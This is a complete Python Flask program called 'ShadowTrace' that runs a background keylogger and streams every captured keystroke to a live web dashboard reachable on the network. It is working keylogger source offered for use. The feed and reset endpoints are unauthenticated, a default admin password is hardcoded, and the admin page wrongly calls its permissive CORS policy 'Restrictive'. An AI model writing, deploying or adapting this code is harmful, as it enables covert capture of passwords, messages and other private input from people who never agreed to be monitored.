import os
import time
import html
import secrets
import threading
from dotenv import load_dotenv
from flask import Flask, render_template_string, jsonify, request, make_response, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash
from pynput.keyboard import Key, Listener

import werkzeug
if not hasattr(werkzeug, '__version__'):
    import importlib.metadata
    try:
        werkzeug.__version__ = importlib.metadata.version('werkzeug')
    except Exception:
        werkzeug.__version__ = '3.1.3'

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', secrets.token_hex(32))

ADMIN_USER = os.getenv('ADMIN_USERNAME', 'admin')
ADMIN_PASS_HASH = os.getenv('ADMIN_PASSWORD_HASH', generate_password_hash(os.getenv('ADMIN_PASSWORD', 'AdminSecure#2026'), method='scrypt'))

log_storage = []
clean_text = ""
storage_lock = threading.Lock()

def on_press(key):
    global clean_text, log_storage
    
    try:
        raw_key_str = str(key).replace("'", "")
        key_str = html.escape(raw_key_str)

        with storage_lock:
            if key == Key.space:
                clean_text += " "
                log_storage.append(" ")
            elif key == Key.enter:
                clean_text += "\n"
                log_storage.append("<br>[ENTER]<br>")
            elif key == Key.backspace:
                clean_text = clean_text[:-1]
                log_storage.append(" [⌫] ")
            elif "Key" in str(key):
                token = html.escape(str(key).split('.')[1].upper())
                log_storage.append(f" <span class='special'>[{token}]</span> ")
            else:
                clean_text += key_str
                log_storage.append(key_str)

            if len(log_storage) > 1000:
                log_storage.pop(0)
    except Exception:
        pass

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

class RateLimiter:
    def __init__(self):
        self.requests = {}
        self.lock = threading.Lock()

    def is_allowed(self, ip, endpoint, max_requests, window_seconds):
        now = time.time()
        key = f"{ip}:{endpoint}"
        with self.lock:
            if key not in self.requests:
                self.requests[key] = []
            self.requests[key] = [t for t in self.requests[key] if now - t < window_seconds]
            if len(self.requests[key]) >= max_requests:
                return False
            self.requests[key].append(now)
            return True

limiter = RateLimiter()

def get_client_ip():
    return request.remote_addr or '127.0.0.1'

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'
    
    response.headers['Content-Security-Policy'] = (
        "default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; "
        "connect-src 'self' *; "
        "frame-ancestors 'self';"
    )

    origin = request.headers.get('Origin')
    allowed_origin = os.getenv('CORS_ORIGIN', '*')
    if origin and (allowed_origin == '*' or origin == allowed_origin):
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'

    return response

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowTrace // Live Monitor</title>
    <style>
        :root { --bg: #000000; --term: #0f0; --dim: #003300; --white: #fff; }
        body {
            background-color: var(--bg); color: var(--term);
            font-family: 'Courier New', monospace; margin: 0; padding: 20px;
            overflow: hidden;
        }
        .header {
            border-bottom: 2px solid var(--term); padding-bottom: 10px;
            margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;
        }
        .status { animation: blink 1s infinite; color: red; font-weight: bold; }
        
        .container { display: flex; gap: 20px; height: 85vh; }
        
        .panel {
            border: 1px solid var(--dim); padding: 15px;
            background: #050505; border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }
        
        #live-feed {
            flex: 2; overflow-y: auto; font-size: 1.1rem;
            line-height: 1.5; white-space: pre-wrap; word-wrap: break-word;
        }
        
        .special { color: #008800; font-size: 0.8rem; }
        
        #stats-panel { flex: 1; display: flex; flex-direction: column; gap: 20px; }
        .stat-box { text-align: center; border: 1px solid var(--dim); padding: 20px; }
        .big-num { font-size: 3rem; font-weight: bold; color: var(--white); }

        .btn-reset {
            background: transparent;
            color: #ff4444;
            border: 1px solid #ff4444;
            padding: 12px 20px;
            font-family: 'Courier New', monospace;
            font-size: 0.95rem;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            width: 100%;
        }
        .btn-reset:hover {
            background: #ff4444;
            color: #000;
            box-shadow: 0 0 15px rgba(255, 68, 68, 0.5);
        }
        .btn-reset:active {
            transform: scale(0.98);
        }

        .alert-toast {
            display: none;
            color: #0f0;
            font-size: 0.85rem;
            margin-top: 10px;
            text-align: center;
        }
        
        @keyframes blink { 50% { opacity: 0; } }
        
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #003300; }
    </style>
</head>
<body>
    <div class="header">
        <div>SHADOW_TRACE v1.0 <span style="font-size:0.8rem; color:#666;">// PORT: 5005 [SECURE]</span></div>
        <div class="status">● RECORDING LIVE</div>
    </div>

    <div class="container">
        <div id="live-feed" class="panel"><span style="color:#666;">Waiting for input...</span></div>

        <div id="stats-panel">
            <div class="panel stat-box">
                <div class="label">TOTAL KEYSTROKES</div>
                <div id="count" class="big-num">0</div>
            </div>
            <div class="panel stat-box">
                <div class="label">SYSTEM STATUS</div>
                <div style="color: var(--term); margin-top:10px;">ACTIVE MONITORING</div>
            </div>
            <div class="panel stat-box">
                <div class="label" style="margin-bottom: 12px;">BUFFER CONTROLS</div>
                <button id="reset-btn" class="btn-reset" onclick="resetLogs()">RESET BUFFER</button>
                <div id="reset-toast" class="alert-toast">✔ BUFFER CLEARED</div>
            </div>
        </div>
    </div>

    <script>
        let isResetting = false;

        function fetchLogs() {
            if (isResetting) return;
            fetch('/update')
                .then(response => response.json())
                .then(data => {
                    const feed = document.getElementById('live-feed');
                    if (data.logs && data.logs.length > 0) {
                        feed.innerHTML = data.logs.join('');
                    } else {
                        feed.innerHTML = '<span style="color:#666;">Waiting for input...</span>';
                    }
                    feed.scrollTop = feed.scrollHeight;
                    document.getElementById('count').innerText = data.count;
                })
                .catch(err => console.error('Fetch error:', err));
        }

        function resetLogs() {
            isResetting = true;
            fetch('/reset', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    document.getElementById('live-feed').innerHTML = '<span style="color:#666;">Waiting for input...</span>';
                    document.getElementById('count').innerText = '0';
                    const toast = document.getElementById('reset-toast');
                    toast.style.display = 'block';
                    setTimeout(() => {
                        toast.style.display = 'none';
                        isResetting = false;
                    }, 1200);
                })
                .catch(err => {
                    console.error('Reset error:', err);
                    isResetting = false;
                });
        }

        setInterval(fetchLogs, 500);
    </script>
</body>
</html>
"""

ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ShadowTrace // Admin Portal</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 40px; }
        .card { max-width: 500px; margin: auto; border: 1px solid #0f0; padding: 25px; border-radius: 6px; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #005522; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: transparent; color: #0f0; border: 1px solid #0f0; font-weight: bold; cursor: pointer; }
        button:hover { background: #0f0; color: #000; }
        .success { color: #00ff99; }
        .error { color: #ff3366; }
    </style>
</head>
<body>
    <div class="card">
        <h2>⚡ ADMIN SECURITY GATEWAY ⚡</h2>
        {% if error %}<p class="error">{{ error }}</p>{% endif %}
        {% if logged_in %}
            <p class="success">✔ OPERATOR AUTHENTICATED: {{ username }}</p>
            <p>Protection Profile: Active</p>
            <p>XSS Sanitization: Enforced</p>
            <p>Rate Limiting: Active (600 req/min)</p>
            <p>CORS Policy: Restrictive</p>
            <p><a href="/admin/logout" style="color:#ff3366;">LOGOUT</a> | <a href="/" style="color:#0f0;">GO TO LIVE HUD</a></p>
        {% else %}
            <form method="POST">
                <label>Admin Username</label>
                <input type="text" name="username" required>
                <label>Password</label>
                <input type="password" name="password" required>
                <button type="submit">AUTHENTICATE</button>
            </form>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/update')
def update():
    client_ip = get_client_ip()
    if not limiter.is_allowed(client_ip, 'update', max_requests=600, window_seconds=60):
        return jsonify({'error': 'Rate limit exceeded'}), 429

    with storage_lock:
        response_data = {
            'logs': list(log_storage),
            'count': len(log_storage)
        }
    
    response = make_response(jsonify(response_data))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response

@app.route('/reset', methods=['GET', 'POST'])
def reset():
    client_ip = get_client_ip()
    if not limiter.is_allowed(client_ip, 'reset', max_requests=60, window_seconds=60):
        return jsonify({'error': 'Rate limit exceeded'}), 429

    global clean_text, log_storage
    with storage_lock:
        log_storage.clear()
        clean_text = ""

    return jsonify({
        'status': 'success',
        'logs': [],
        'count': 0
    })

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    client_ip = get_client_ip()
    if not limiter.is_allowed(client_ip, 'admin', max_requests=5, window_seconds=60):
        return render_template_string(ADMIN_TEMPLATE, error="Too many attempts. Rate limit enforced.", logged_in=False), 429

    error = None
    if request.method == 'POST':
        user = request.form.get('username', '').strip()
        pwd = request.form.get('password', '')
        if user == ADMIN_USER and check_password_hash(ADMIN_PASS_HASH, pwd):
            session['admin'] = user
            return redirect(url_for('admin'))
        else:
            error = "Invalid administrator credentials."

    logged_in = 'admin' in session
    return render_template_string(ADMIN_TEMPLATE, error=error, logged_in=logged_in, username=session.get('admin', ''))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin'))

@app.errorhandler(400)
def bad_request(e):
    return jsonify({'error': 'Bad Request', 'code': 400}), 400

@app.errorhandler(404)
def not_found(e):
    return jsonify({'error': 'Not Found', 'code': 404}), 404

@app.errorhandler(429)
def too_many_requests(e):
    return jsonify({'error': 'Too Many Requests', 'code': 429}), 429

@app.errorhandler(500)
def internal_error(e):
    return jsonify({'error': 'Internal Server Error', 'code': 500}), 500

if __name__ == '__main__':
    host = os.getenv('HOST', '0.0.0.0')
    try:
        port = int(os.getenv('PORT', 5005))
    except ValueError:
        port = 5005

    print("---------------------------------------------")
    print("   SHADOW_TRACE INITIALIZED")
    print("   1. Keylogger running in background...")
    print(f"   2. Web Interface running on Port {port}")
    print("---------------------------------------------")

    logger_thread = threading.Thread(target=start_keylogger)
    logger_thread.daemon = True 
    logger_thread.start()

    app.run(host=host, port=port, debug=False)
